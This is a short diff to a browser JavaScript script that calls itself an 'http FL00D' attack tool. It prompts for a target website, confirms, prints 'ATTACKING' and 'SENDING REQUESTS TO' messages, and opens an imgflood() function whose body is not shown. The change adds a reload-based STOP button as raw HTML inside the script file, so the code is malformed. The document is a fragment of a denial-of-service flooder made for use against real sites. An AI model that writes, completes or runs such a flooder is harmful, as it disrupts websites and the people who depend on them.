@@ -1,3 +1,6 @@
+<input type="button" value = "STOP" onclick="history.go(0)" />
+
+
 function a() {
 
     var x = prompt("Website Here, example.com: ");
@@ -7,7 +10,6 @@ let text = "Are You Sure?\nOK or Cancel.";
 if (confirm(text) == true) {
 text = alert("http FL00D V1 ATTACKING : " + x);
 text = document.write("SENDING REQUESTS TO : " + x);
-
 
 
 function imgflood() { 
